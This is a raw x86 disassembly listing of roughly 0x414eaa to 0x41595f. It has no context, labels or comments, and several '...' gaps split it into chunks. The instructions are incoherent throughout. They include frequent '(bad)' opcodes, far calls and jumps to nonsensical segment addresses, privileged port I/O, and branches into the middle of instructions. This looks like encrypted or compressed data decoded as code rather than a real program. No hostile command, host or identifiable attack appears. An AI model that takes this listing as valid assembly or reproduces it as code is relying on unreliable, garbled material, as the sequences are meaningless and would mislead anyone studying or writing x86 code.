  414eaa:	push   edi
  414eab:	xchg   edx,eax
  414eac:	loop   0x414e43
  414eae:	lods   al,BYTE PTR ds:[esi]
  414eaf:	loope  0x414e3b
  414eb1:	dec    esp
  414eb2:	jmp    0x9d55:0x62cc3223
  414eb9:	bnd jg 0x414ec5
  414ebc:	fsub   QWORD PTR [edx-0x13]
  414ebf:	xchg   BYTE PTR [edx-0x2f],ch
  414ec2:	add    ebx,DWORD PTR [edi]
  414ec4:	iret   
  414ec5:	lods   eax,DWORD PTR ds:[esi]
  414ec6:	pop    edx
  414ec7:	mov    edi,0x7db2ada3
  414ecc:	aaa    
  414ecd:	test   BYTE PTR [edx-0x636b73d3],dh
  414ed3:	xor    al,0x3f
  414ed5:	cld    
  414ed6:	mov    ?,WORD PTR [esi-0x4cb930ee]
  414edc:	fsubr  st,st(7)
  414ede:	fwait
  414edf:	jns    0x414f33
  414ee1:	dec    ecx
  414ee2:	scas   al,BYTE PTR es:[edi]
  414ee3:	ds push 0xfffffffe
  414ee6:	push   esi
  414ee7:	outs   dx,BYTE PTR ds:[esi]
  414ee8:	lea    eax,[esi+0x3f29095f]
  414eee:	mov    cl,0x1a
  414ef0:	adc    ebx,DWORD PTR [edi-0x7b]
  414ef3:	dec    ecx
  414ef4:	leave  
  414ef5:	lods   al,BYTE PTR ds:[esi]
  414ef6:	int    0x64
  414ef8:	sbb    al,BYTE PTR [ebx-0x7b]
  414efb:	xchg   cl,dl
  414efd:	repz xor al,0x43
  414f00:	or     BYTE PTR [esi+0x15],cl
  414f03:	sahf   
  414f04:	sub    BYTE PTR [ebp+0x3a61a1fd],ah
  414f0a:	and    DWORD PTR [edi],0x10
  414f0d:	popa   
  414f0e:	push   es
  414f0f:	lds    esi,FWORD PTR [esi+0x0]
	...
  414f71:	add    BYTE PTR [eax],al
  414f73:	add    BYTE PTR [edi],dh
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd13:0x808d57a6
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    eax,0xa2000001
  414f8d:	jb     0x414fbf
  414f8f:	int    0x1
  414f91:	or     eax,DWORD PTR [ebx+0xd]
  414f94:	jecxz  0x414fff
  414f96:	imul   ebx,esp,0xffffffb0
  414f99:	mov    ds:0x6350be05,eax
  414f9e:	xchg   BYTE PTR [eax],dl
  414fa0:	fiadd  WORD PTR [edi+0x76]
  414fa3:	cmp    DWORD PTR [ebx],edx
  414fa5:	in     al,0x1c
  414fa7:	sub    BYTE PTR [eax-0x7b],ah
  414faa:	loop   0x414ff6
  414fac:	sub    eax,DWORD PTR [edx-0x3b]
  414faf:	or     ecx,DWORD PTR [edi]
  414fb1:	dec    ebp
  414fb2:	das    
  414fb3:	popf   
  414fb4:	cs dec eax
  414fb6:	xor    DWORD PTR [ebp-0x7c],edi
  414fb9:	jmp    0x415012
  414fbb:	adc    BYTE PTR [ebp+edx*8-0x6325129e],al
  414fc2:	in     eax,0xec
  414fc4:	nop
  414fc5:	mov    dl,0x33
  414fc7:	imul   BYTE PTR [ebp+0x42c3d37d]
  414fcd:	fidiv  WORD PTR [eax+0x5788ea61]
  414fd3:	push   edx
  414fd4:	je     0x415044
  414fd6:	adc    eax,0x5b5f4882
  414fdb:	ds fwait
  414fdd:	jmp    0x7b027de6
  414fe2:	mov    edx,0x7b84ecf3
  414fe7:	stos   BYTE PTR es:[edi],al
  414fe8:	imul   eax,DWORD PTR [edx-0x5c6f2c13],0xffffffeb
  414fef:	xchg   ebp,eax
  414ff0:	or     BYTE PTR [edi-0x25dd6472],bl
  414ff6:	icebp  
  414ff7:	out    0x88,al
  414ff9:	or     DWORD PTR [edx+0x7c8a221a],0x1aaac84d
  415003:	mov    al,BYTE PTR [ecx]
  415005:	adc    DWORD PTR [ecx+0x0],0xfffffff8
  415009:	jl     0x414fbd
  41500b:	sbb    dl,BYTE PTR [edx+0xe]
  41500e:	mov    ch,ch
  415010:	inc    esi
  415011:	mov    dl,0xd2
  415013:	js     0x414fff
  415015:	dec    eax
  415016:	push   eax
  415017:	leave  
  415018:	jmpw   0xcdfb
  41501c:	shr    BYTE PTR [ecx],cl
  41501e:	push   esp
  41501f:	pop    ds
  415020:	xor    DWORD PTR [edx+ecx*1-0x66],edx
  415024:	sahf   
  415025:	(bad)
  415028:	add    eax,0x7f9d6c16
  41502d:	mov    DWORD PTR [edx+eax*1],edx
  415030:	out    0xf6,eax
  415032:	leave  
  415033:	hlt    
  415034:	out    0x7e,al
  415036:	mov    dh,0x84
  415038:	cmp    eax,0xa0e89884
  41503d:	sub    DWORD PTR [esi-0x50af2dd9],esi
  415043:	outs   dx,DWORD PTR ds:[esi]
  415045:	xor    esi,ebp
  415047:	push   0x9ec1d667
  41504c:	or     al,0x19
  41504e:	dec    esp
  41504f:	xchg   ebx,eax
  415050:	fistp  QWORD PTR [ebp+0x761571cd]
  415056:	mov    ch,0xc
  415058:	push   ss
  415059:	xlat   BYTE PTR ds:[ebx]
  41505a:	jb     0x41501a
  41505c:	push   ebx
  41505d:	fdiv   DWORD PTR [edi+eiz*4-0x68]
  415061:	call   0x8026bf9b
  415066:	mov    bl,BYTE PTR [ecx+eax*4+0x60]
  41506a:	push   edx
  41506b:	imul   esp,DWORD PTR [esp+eax*2],0xafb7a422
  415072:	fdivr  st,st(1)
  415074:	or     BYTE PTR [ebp+0x455dd131],0x38
  41507b:	cmp    eax,0xb263f210
  415080:	loope  0x41509e
  415082:	dec    esi
  415083:	jne    0x4150df
  415085:	or     eax,0xe3c7f1c2
  41508a:	aaa    
  41508b:	aas    
  41508c:	pusha  
  41508d:	mul    edi
  41508f:	call   0x4150ff
	...
  4150f4:	jnp    0x4150f8
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0xcc43fc2d
  415102:	mov    ecx,0xde1814
  415107:	add    BYTE PTR ds:0xd3000001,al
  41510d:	fmul   QWORD PTR [edi*1+0x1e5123fb]
  415114:	mov    eax,0x5f662983
  415119:	ds nop
  41511b:	daa    
  41511c:	in     eax,0x4
  41511e:	add    al,BYTE PTR [esi+0xc85c0c4]
  415124:	adc    edi,ebp
  415126:	dec    edx
  415127:	fcomp  QWORD PTR [ecx-0x32]
  41512a:	test   eax,0x8eec17f5
  41512f:	mov    ebx,0xec04d264
  415134:	sub    BYTE PTR [edx+0x22b0987f],ch
  41513a:	in     eax,dx
  41513b:	pop    edx
  41513c:	(bad)  
  41513d:	out    dx,al
  41513e:	sbb    eax,0x20fcf76b
  415143:	lds    ebp,FWORD PTR [ecx+0x1a6acd2f]
  415149:	or     al,0xe
  41514b:	mov    ax,WORD PTR [edi]
  41514e:	or     al,0x20
  415150:	xchg   ebp,eax
  415151:	int    0x35
  415153:	and    al,0x19
  415155:	mov    ds:0x668d504d,eax
  41515a:	push   es
  41515b:	ror    eax,1
  41515d:	cmp    eax,0x7818bd04
  415162:	repz sbb al,0x51
  415165:	(bad)
  415168:	mov    eax,0x67697011
  41516d:	jmp    0x4151e7
  41516f:	xor    eax,0x33
  415172:	jmp    0x5568ec07
  415177:	je     0x4150fb
  415179:	inc    edx
  41517a:	cmp    al,0x78
  41517c:	test   dl,ah
  41517e:	test   cl,0x66
  415181:	push   eax
  415182:	ins    BYTE PTR es:[edi],dx
  415183:	sbb    ebp,DWORD PTR [ebx+ecx*8-0x1d]
  415187:	sbb    ecx,DWORD PTR [ebp+0x28]
  41518a:	mov    ecx,0xc07dcc0
  41518f:	retf   0xd0fe
  415192:	ins    DWORD PTR es:[edi],dx
  415193:	leave  
  415194:	push   edx
  415195:	sti    
  415196:	pop    es
  415197:	fsubr  QWORD PTR ds:0x45c6a143
  41519d:	adc    eax,DWORD PTR [ebp-0x49]
  4151a0:	addr16 push esp
  4151a2:	jecxz  0x415180
  4151a4:	int3   
  4151a5:	pop    ebp
  4151a6:	pop    ebx
  4151a7:	dec    edi
  4151a8:	int3   
  4151a9:	xor    esi,0xffffffdc
  4151ac:	(bad)  
  4151ad:	test   eax,0xd937170f
  4151b2:	lock add eax,0xe60ecaee
  4151b8:	fnstcw WORD PTR [ecx]
  4151ba:	cs hlt 
  4151bc:	mov    dh,0x3a
  4151be:	cld    
  4151bf:	adc    ch,BYTE PTR [ecx-0x6ceea689]
  4151c5:	popf   
  4151c6:	test   DWORD PTR [edi+0x6b],0x63635c91
  4151cd:	int    0x64
  4151cf:	aaa    
  4151d0:	adc    BYTE PTR [edi+ecx*4-0x355e1db4],dh
  4151d7:	cwde   
  4151d8:	(bad)  
  4151d9:	repz jno 0x41515c
  4151dc:	call   0x9299:0x47ae9d30
  4151e3:	add    DWORD PTR [ebp+0x1d1e8960],esi
  4151e9:	inc    ebx
  4151ea:	adc    edx,ebx
  4151ec:	xor    ecx,DWORD PTR [ebx+0x6f855f1f]
  4151f2:	mov    BYTE PTR [ecx],dl
  4151f4:	popa   
  4151f5:	push   cs
  4151f6:	and    eax,0xc20e2ac8
  4151fb:	mov    dh,0xa8
  4151fd:	inc    ebx
  4151fe:	sub    ebx,0xf43e2250
  415204:	mov    bh,al
  415206:	dec    edi
  415207:	cmp    BYTE PTR [ebp+0x16136ece],dh
  41520d:	hlt    
  41520e:	inc    esp
  41520f:	in     eax,0x47
	...
  415271:	add    BYTE PTR [eax],al
  415273:	add    BYTE PTR [edi+edx*4],ch
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0x74b8010b
  415283:	loope  0x4152a2
  415285:	fild   WORD PTR [eax]
  415287:	add    BYTE PTR ds:0xf9000001,al
  41528d:	lods   eax,DWORD PTR ds:[esi]
  41528e:	lds    eax,FWORD PTR [edi]
  415290:	fisttp QWORD PTR [eax-0x4aa077a4]
  415296:	mov    bh,0xaf
  415298:	(bad)  
  415299:	xchg   ebx,eax
  41529a:	jbe    0x4152ab
  41529c:	sti    
  41529d:	pop    ecx
  41529e:	push   esp
  41529f:	sysenter 
  4152a1:	push   esp
  4152a2:	mov    bh,bl
  4152a4:	cmp    BYTE PTR [edi-0x71bcf7f8],0x85
  4152ab:	mov    ds:0x4b4a1286,eax
  4152b0:	bound  esp,QWORD PTR [ecx-0x7dcc188a]
  4152b6:	and    ecx,DWORD PTR [ebp+0x6d]
  4152b9:	in     al,dx
  4152ba:	mov    ebx,0x4b87d275
  4152bf:	jmp    0x971c54fb
  4152c4:	xchg   ebp,eax
  4152c5:	je     0x4152c7
  4152c7:	addr16 jno 0x415311
  4152ca:	inc    ebp
  4152cb:	lods   eax,DWORD PTR ds:[esi]
  4152cc:	add    al,0xb
  4152ce:	mov    ebp,0xcbabd2e5
  4152d3:	repnz xchg edx,eax
  4152d5:	adc    ah,BYTE PTR [eax-0x757fdca2]
  4152db:	mov    dl,0xe9
  4152dd:	add    DWORD PTR [ecx-0x38],0x60
  4152e1:	inc    ebp
  4152e2:	scas   al,BYTE PTR es:[edi]
  4152e3:	jl     0x415304
  4152e5:	cmp    BYTE PTR [ecx],ch
  4152e7:	ret    0xfb6b
  4152ea:	sbb    DWORD PTR [edx],edx
  4152ec:	or     DWORD PTR [edx+0x52a1283d],ebp
  4152f2:	pop    es
  4152f3:	mov    bl,0xe
  4152f5:	(bad)  
  4152f8:	jle    0x415306
  4152fa:	inc    edi
  4152fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152fc:	xchg   DWORD PTR [eax-0x7a],ecx
  4152ff:	js     0x415325
  415301:	dec    ebx
  415302:	push   es
  415303:	not    DWORD PTR [eax]
  415305:	sbb    ebp,DWORD PTR [ebx]
  415307:	inc    esi
  415308:	jecxz  0x4152d6
  41530a:	fldenv [esi-0x17]
  41530d:	sub    bh,ah
  41530f:	add    DWORD PTR [edx+0x56],ecx
  415312:	mov    ds:0x9c551208,eax
  415317:	and    dh,BYTE PTR [ebp+0x3c]
  41531a:	push   ebp
  41531b:	rol    BYTE PTR [ecx-0x5376678],0x4b
  415322:	and    ecx,DWORD PTR [edi-0x4a]
  415325:	into   
  415326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415327:	imul   ebx,DWORD PTR [ebx],0xffffffaa
  41532a:	mov    ebp,0x10820b38
  41532f:	jp     0x4153a4
  415331:	int    0xcf
  415333:	jb     0x6b32e0a8
  415339:	sub    DWORD PTR [ecx],esi
  41533b:	cmp    DWORD PTR [ecx+0x7e],0xe3d170f6
  415342:	sub    BYTE PTR [ebx],al
  415344:	xchg   edx,eax
  415345:	jp     0x4152cf
  415347:	push   ds
  415348:	and    al,0x30
  41534a:	push   ebp
  41534b:	leave  
  41534c:	call   0xf227:0x66638700
  415353:	push   ecx
  415354:	adc    eax,0x5101f249
  415359:	xlat   BYTE PTR ds:[ebx]
  41535a:	rol    BYTE PTR [eax-0x35eebda7],cl
  415360:	or     ch,dh
  415362:	sar    ecx,cl
  415364:	xchg   esp,eax
  415365:	cs dec ecx
  415367:	add    eax,0x148d99b8
  41536c:	push   0x45
  41536e:	sbb    DWORD PTR [eax+ebp*2],eax
  415371:	leave  
  415372:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415373:	xchg   ecx,eax
  415374:	fcmovbe st,st(2)
  415376:	js     0x41531e
  415378:	xor    al,0x7
  41537a:	addr16 mov ebx,0x345a4b3d
  415380:	aaa    
  415381:	shr    BYTE PTR [eax+0x19],cl
  415384:	dec    edx
  415385:	out    0xf,al
  415387:	ror    BYTE PTR [edx-0x215e1603],1
  41538d:	jb     0x415397
  41538f:	cmp    BYTE PTR [esi+0x0],cl
	...
  4153f1:	add    BYTE PTR [eax],al
  4153f3:	add    BYTE PTR [ebp-0x10],ch
  4153f6:	repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0xa1d3e5b0
  415401:	mov    al,ds:0xe022075b
  415406:	add    BYTE PTR [eax],al
  415408:	add    eax,0x9e000001
  41540d:	repz leave 
  41540f:	lea    ecx,[edi+0x28]
  415412:	adc    ch,BYTE PTR [esi-0x587e8289]
  415418:	jmp    0xc7b:0xb0f8d0ea
  41541f:	xchg   ecx,eax
  415420:	mov    bl,0xbb
  415422:	adc    ch,BYTE PTR [edi-0x42]
  415425:	mov    al,0xb2
  415427:	mov    cl,0x1a
  415429:	inc    esp
  41542a:	dec    esp
  41542b:	in     al,0xdb
  41542d:	mov    eax,0x72207d78
  415432:	imul   ecx,DWORD PTR [edi-0x3e],0xffffffbc
  415436:	call   0x6cac:0xde45f659
  41543d:	adc    ah,0x78
  415440:	call   0x3bf934ef
  415445:	xor    al,BYTE PTR [esi-0x5a]
  415448:	jmp    0xf8b026b6
  41544d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41544e:	xlat   BYTE PTR ds:[ebx]
  41544f:	fbld   TBYTE PTR [ebp+0x3f]
  415452:	(bad)  
  415453:	mov    ch,BYTE PTR [eax+ebx*2]
  415456:	mov    al,BYTE PTR [edx-0x431eb056]
  41545c:	repz repnz div BYTE PTR [ebx]
  415460:	bound  esi,QWORD PTR [edi-0x48]
  415463:	xor    ebp,DWORD PTR [edi-0x73]
  415466:	mov    eax,ds:0xaa5ef8ac
  41546b:	inc    edi
  41546c:	cmp    esp,esp
  41546e:	mov    ds:0x81d3dd99,al
  415473:	cmp    al,0xae
  415475:	aas    
  415476:	das    
  415477:	pop    ebp
  415478:	cmp    eax,0xd5fb114d
  41547d:	sbb    eax,0x1c286855
  415482:	call   0x8bc1a732
  415487:	sub    eax,0x7f211609
  41548c:	imul   eax,DWORD PTR [edi+0x82285f0],0xffffffb5
  415493:	hlt    
  415494:	jae    0x4154ef
  415496:	dec    ebp
  415497:	xor    eax,DWORD PTR [ebx]
  415499:	popa   
  41549a:	cmp    al,0xc7
  41549c:	shr    DWORD PTR [ecx+ebx*1],1
  41549f:	and    eax,0x53a68b09
  4154a4:	lods   eax,DWORD PTR ds:[esi]
  4154a5:	mov    esi,0x4f3cf1ed
  4154aa:	mov    DWORD PTR [ecx-0x7f],esi
  4154ad:	test   DWORD PTR [ebx+0xd],0x3a7dfb6b
  4154b4:	and    eax,ecx
  4154b6:	mov    cl,BYTE PTR [edi+0x6977a9ce]
  4154bc:	mov    ds:0x7fe2e80b,al
  4154c1:	add    ecx,esp
  4154c3:	mov    esp,0xf37116a2
  4154c8:	mov    eax,ds:0xf909c334
  4154cd:	aas    
  4154ce:	stos   BYTE PTR es:[edi],al
  4154cf:	mov    al,ds:0xd0ef222a
  4154d4:	add    bl,BYTE PTR [esi]
  4154d6:	push   eax
  4154d7:	in     al,0x9
  4154d9:	mov    bl,0xd7
  4154db:	sbb    BYTE PTR [ebp-0x48],dl
  4154de:	inc    eax
  4154df:	xchg   esp,eax
  4154e0:	div    BYTE PTR [edi+eiz*8-0x78]
  4154e4:	daa    
  4154e5:	sbb    al,0xe
  4154e7:	ss sar bl,0x2e
  4154eb:	adc    al,ch
  4154ed:	xchg   edi,eax
  4154ee:	fidivr DWORD PTR [eax+ecx*2]
  4154f1:	push   0xffffffb2
  4154f3:	adc    al,0x9d
  4154f5:	mov    esi,0x1d7cc2fc
  4154fa:	adc    edx,DWORD PTR [ebx]
  4154fc:	adc    DWORD PTR [ecx-0x110795db],0xffffffd5
  415503:	push   ds
  415504:	ret    
  415505:	or     eax,0xe60eaf3f
  41550a:	daa    
  41550b:	xor    bl,bl
  41550d:	lahf   
  41550e:	int3   
  41550f:	jle    0x4154c0
	...
  415571:	add    BYTE PTR [eax],al
  415573:	add    ah,ah
  415575:	lock sub DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x415573
  415581:	sti    
  415582:	(bad)  
  415584:	daa    
  415585:	loope  0x415587
  415587:	add    BYTE PTR ds:0x11000001,al
  41558d:	inc    edi
  41558e:	mov    esp,0xe47a04d6
  415593:	push   edx
  415594:	cmp    cl,BYTE PTR [eax+0x656d0c93]
  41559a:	test   al,0x70
  41559c:	(bad)  
  41559d:	inc    esi
  41559e:	inc    ebp
  41559f:	mov    bl,0x3c
  4155a1:	xchg   ebx,edi
  4155a3:	xchg   ebp,eax
  4155a4:	sbb    DWORD PTR [esi+0x466edd74],ecx
  4155aa:	and    ebx,DWORD PTR [edx-0x6a]
  4155ad:	inc    esp
  4155ae:	ds fdiv st,st(3)
  4155b1:	inc    edi
  4155b2:	leave  
  4155b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155b4:	call   0xa58d:0xf94c8983
  4155bb:	stos   DWORD PTR es:[edi],eax
  4155bc:	jp     0x41558b
  4155be:	test   BYTE PTR ds:0xe6dfb708,ch
  4155c4:	mov    dh,0xd7
  4155c6:	test   al,0xcd
  4155c8:	out    dx,al
  4155c9:	popa   
  4155ca:	bound  esi,QWORD PTR [eax]
  4155cc:	lock addr16 mov dh,0x5b
  4155d0:	popf   
  4155d1:	pop    ebx
  4155d2:	jl     0x4155ba
  4155d4:	test   BYTE PTR [edi],0x5e
  4155d7:	jg     0x4155ed
  4155d9:	xor    al,0xe7
  4155db:	icebp  
  4155dc:	mov    edx,0x97c75df
  4155e1:	sbb    DWORD PTR [edx-0x7ea6f306],edi
  4155e7:	ret    0x3628
  4155ea:	cmp    BYTE PTR [ebp-0x87709e5],dl
  4155f0:	or     eax,0x8b7bcefb
  4155f5:	jmp    0x387dff63
  4155fa:	daa    
  4155fb:	sbb    dh,ch
  4155fd:	ret    0xc599
  415600:	dec    esi
  415601:	lds    ecx,FWORD PTR [ecx+0x21]
  415604:	push   ecx
  415605:	fld    TBYTE PTR [ebx-0x39009661]
  41560b:	lds    ebp,FWORD PTR [eax]
  41560d:	xchg   edi,eax
  41560e:	xchg   edx,eax
  41560f:	pop    esp
  415610:	sub    edx,edi
  415612:	xchg   edx,eax
  415613:	loopne 0x415676
  415615:	sbb    eax,0x1565776a
  41561a:	or     esp,eax
  41561c:	iret   
  41561d:	sbb    BYTE PTR [edx-0x68],ah
  415620:	inc    eax
  415621:	jge    0x4155ba
  415623:	jecxz  0x41564b
  415625:	call   0xea74:0x8ebdbe08
  41562c:	ins    DWORD PTR es:[edi],dx
  41562d:	or     DWORD PTR [esi-0x41],ebx
  415630:	add    eax,0x89361eb4
  415635:	test   eax,0x135dda5a
  41563a:	adc    ebx,ecx
  41563c:	dec    esi
  41563d:	das    
  41563e:	cmp    al,0x1b
  415640:	dec    ecx
  415641:	or     ecx,DWORD PTR [ecx+0x39]
  415644:	cmc    
  415645:	imul   BYTE PTR [esi-0x21]
  415648:	jbe    0x4155fa
  41564a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41564b:	repz pusha 
  41564d:	test   BYTE PTR [edx+0x7e05f771],0x63
  415654:	adc    DWORD PTR [esi+0x11],esp
  415657:	stos   BYTE PTR es:[edi],al
  415658:	(bad)  
  415659:	ins    BYTE PTR es:[edi],dx
  41565a:	jecxz  0x415676
  41565c:	dec    esi
  41565d:	je     0x415639
  41565f:	mov    BYTE PTR [ebx],ch
  415661:	data16 jmp 0x4156df
  415664:	ret    
  415665:	sub    BYTE PTR [ecx-0x557a3656],al
  41566b:	jg     0x4155f7
  41566d:	fwait
  41566e:	popa   
  41566f:	je     0x415642
  415671:	fiadd  WORD PTR [ebp+0x538126d]
  415677:	(bad)  
  415678:	jo     0x415609
  41567a:	jmp    0x3968:0x1321d907
  415681:	fisttp WORD PTR [ebx]
  415683:	in     eax,0xba
  415685:	adc    DWORD PTR ss:[esi-0x35],eax
  415689:	or     BYTE PTR [edx],dl
  41568b:	das    
  41568c:	dec    ebp
  41568d:	inc    eax
  41568e:	jne    0x415684
  415690:	pusha  
	...
  4156f1:	add    BYTE PTR [eax],al
  4156f3:	add    BYTE PTR [ebp-0x66],ch
  4156f6:	mov    esp,0xfd67ff45
  4156fb:	mov    edx,0x2c46bab3
  415700:	mov    dh,0xd1
  415702:	mov    cl,0xbf
  415704:	sub    al,0xe2
  415706:	add    BYTE PTR [eax],al
  415708:	add    eax,0xe3000001
  41570d:	xchg   ecx,eax
  41570e:	jns    0x4156ba
  415710:	arpl   WORD PTR [ebx-0x45810618],sp
  415716:	inc    ecx
  415717:	test   ah,al
  415719:	enter  0x3857,0x2f
  41571d:	add    BYTE PTR [edx],bl
  41571f:	mov    edi,DWORD PTR [esi+esi*8-0x7089ccb1]
  415726:	adc    bl,BYTE PTR [ecx-0x6]
  415729:	ja     0x415783
  41572b:	enter  0xe9a4,0x63
  41572f:	cmp    BYTE PTR [ecx+0x3],bh
  415732:	dec    eax
  415733:	jecxz  0x415749
  415735:	or     BYTE PTR [esi+ebp*1+0x177265fa],ch
  41573c:	aad    0x4a
  41573e:	fs scas al,BYTE PTR es:[edi]
  415740:	(bad)  
  415741:	or     BYTE PTR [ebp-0x15],al
  415744:	dec    ebx
  415745:	mov    DWORD PTR [eax+0xc],0x85b00ec8
  41574c:	ss fwait
  41574e:	xor    DWORD PTR [esi+0x7a],ecx
  415751:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415752:	inc    edx
  415753:	clc    
  415754:	retf   0x76f3
  415757:	or     eax,0xdb3afc04
  41575c:	int    0x4e
  41575e:	adc    BYTE PTR [ebx-0x2f437f42],dl
  415764:	out    0xac,eax
  415766:	stos   DWORD PTR es:[edi],eax
  415767:	punpckhdq mm4,QWORD PTR [ecx+0x3cd6ae00]
  41576e:	outs   dx,BYTE PTR ds:[esi]
  41576f:	pushf  
  415770:	enter  0x36cb,0xb7
  415774:	mov    BYTE PTR [eax-0x40],cl
  415777:	inc    esi
  415778:	jo     0x4157b3
  41577a:	repnz (bad) 
  41577c:	arpl   WORD PTR [edi+0x2],si
  41577f:	inc    edx
  415780:	mov    ds:0x556438f4,al
  415785:	ins    DWORD PTR es:[edi],dx
  415786:	or     DWORD PTR [esi+0x4d6dcbd0],esi
  41578c:	dec    edx
  41578d:	jge    0x4157a3
  41578f:	and    esp,DWORD PTR [ecx-0x1cc621ee]
  415795:	xor    eax,0xf4b10454
  41579a:	aam    0x96
  41579c:	pushaw 
  41579e:	dec    ecx
  41579f:	cmp    esi,0x2d
  4157a2:	out    0x19,al
  4157a4:	mov    bl,0x9a
  4157a6:	adc    dl,bh
  4157a8:	xchg   ebp,eax
  4157a9:	ins    DWORD PTR es:[edi],dx
  4157aa:	adc    al,0xe1
  4157ac:	js     0x4157b9
  4157ae:	cmp    BYTE PTR [ecx],0xdb
  4157b1:	out    0xf9,al
  4157b3:	inc    DWORD PTR [esi]
  4157b5:	add    eax,0xb6cb0b83
  4157ba:	sti    
  4157bb:	call   0xba7e7507
  4157c0:	lds    ebp,FWORD PTR [eax-0x4ec3e2ff]
  4157c6:	mov    al,bh
  4157c8:	sti    
  4157c9:	mov    BYTE PTR [edx*1-0xe7139bd],ch
  4157d0:	mov    dl,0xdb
  4157d2:	xchg   DWORD PTR ds:0x9d06b0d8,ebx
  4157d8:	fcomp  QWORD PTR [ecx]
  4157da:	scas   al,BYTE PTR es:[edi]
  4157db:	test   eax,0xf37f81e4
  4157e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157e1:	pop    ecx
  4157e2:	mov    DWORD PTR [edx+0x58],edx
  4157e5:	rcr    BYTE PTR [ecx-0x1135cc05],cl
  4157eb:	sbb    bh,bh
  4157ed:	sbb    edi,ebp
  4157ef:	sbb    DWORD PTR [ecx-0x2a],edi
  4157f2:	and    DWORD PTR [ebx+edx*4+0xd1b7de2],eax
  4157f9:	lea    eax,[eax+eax*4+0x686ef75b]
  415800:	fisub  WORD PTR [ebx-0x7e]
  415803:	int3   
  415804:	das    
  415805:	xor    esi,DWORD PTR [ecx]
  415807:	mov    ds:0x12ae9204,eax
  41580c:	cmp    dh,BYTE PTR [edx+0xba3e13]
	...
  415872:	add    BYTE PTR [eax],al
  415874:	retf   
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	shr    DWORD PTR [eax+0x315bc2e2],cl
  415885:	jecxz  0x415887
  415887:	add    BYTE PTR ds:0xa3000001,al
  41588d:	xchg   BYTE PTR [esi+0x7b7c818a],bl
  415893:	sti    
  415894:	lahf   
  415895:	(bad)  
  415897:	add    DWORD PTR ds:0x7893e296,esp
  41589d:	add    ecx,DWORD PTR [esi-0x4]
  4158a0:	int    0xc9
  4158a2:	mov    ch,0x4
  4158a4:	xchg   ecx,eax
  4158a5:	lods   al,BYTE PTR ds:[esi]
  4158a6:	shl    ecx,1
  4158a8:	sbb    esi,DWORD PTR ds:0x20cd7500
  4158ae:	aas    
  4158af:	jmp    0xcb851581
  4158b4:	stos   DWORD PTR es:[edi],eax
  4158b5:	mov    edx,DWORD PTR [ebx-0x6e]
  4158b8:	hlt    
  4158b9:	sbb    DWORD PTR [esi+0x53622155],ebx
  4158bf:	cmp    BYTE PTR [edx+0x61],ah
  4158c2:	cmp    BYTE PTR [ebp-0x73df2430],ah
  4158c8:	aaa    
  4158c9:	js     0x415934
  4158cb:	vmread DWORD PTR [ecx-0x26c99c33],eax
  4158d2:	out    dx,al
  4158d3:	xchg   edx,eax
  4158d4:	fisub  DWORD PTR [edi+0x751ea81]
  4158da:	dec    esp
  4158db:	add    DWORD PTR [esi+0x5c9fbc52],ebx
  4158e1:	mov    esi,0xa7095e7f
  4158e6:	mov    WORD PTR [edi],fs
  4158e8:	dec    esi
  4158e9:	leave  
  4158ea:	xchg   cl,cl
  4158ec:	stos   BYTE PTR es:[edi],al
  4158ed:	jg     0x4158dd
  4158ef:	push   es
  4158f0:	dec    edx
  4158f1:	out    0x1d,al
  4158f3:	and    BYTE PTR [esi+0x2c],bl
  4158f6:	scas   eax,DWORD PTR es:[edi]
  4158f7:	pop    eax
  4158f8:	fcom   st(5)
  4158fa:	xchg   bh,ch
  4158fc:	test   DWORD PTR [edi+edi*8-0x31],esi
  415900:	cmp    dl,ch
  415902:	inc    ebx
  415903:	adc    al,0x60
  415905:	jp     0x415942
  415907:	mov    al,0xf4
  415909:	cmp    al,0x50
  41590b:	xor    DWORD PTR [esi],ebx
  41590d:	inc    esi
  41590e:	sub    BYTE PTR [ecx+0x59],bh
  415911:	adc    dh,bl
  415913:	(bad)  
  415914:	in     al,dx
  415915:	(bad)  [esi+esi*4]
  415918:	ins    BYTE PTR es:[edi],dx
  415919:	mov    esp,0x161106af
  41591e:	sahf   
  41591f:	xchg   ecx,eax
  415920:	jae    0x4158f3
  415922:	cli    
  415923:	or     DWORD PTR [ecx],edi
  415925:	jecxz  0x4158dc
  415927:	mov    esi,0xaad355c8
  41592c:	sahf   
  41592d:	hlt    
  41592e:	adc    BYTE PTR [esi+0x7c2a9c05],dl
  415934:	jp     0x4158cf
  415936:	pop    esp
  415937:	stos   DWORD PTR es:[edi],eax
  415938:	pop    edx
  415939:	pop    esp
  41593a:	jg     0x4158bc
  41593c:	mov    ebp,0xac8410de
  415941:	and    bh,BYTE PTR [eax-0x5]
  415944:	or     dh,BYTE PTR [esi-0x29]
  415947:	jns    0x4158e0
  415949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41594a:	into   
  41594b:	xchg   ecx,eax
  41594c:	stc    
  41594d:	scas   al,BYTE PTR es:[edi]
  41594e:	push   esp
  41594f:	add    ebp,DWORD PTR ss:[ecx+edi*2-0x27]
  415954:	ds test ecx,edi
  415957:	outs   dx,DWORD PTR fs:[esi]
  415959:	ss cmp eax,esi
  41595c:	xchg   ebx,eax
  41595d:	aas    
  41595e:	dec    eax
  41595f:	inc    edi
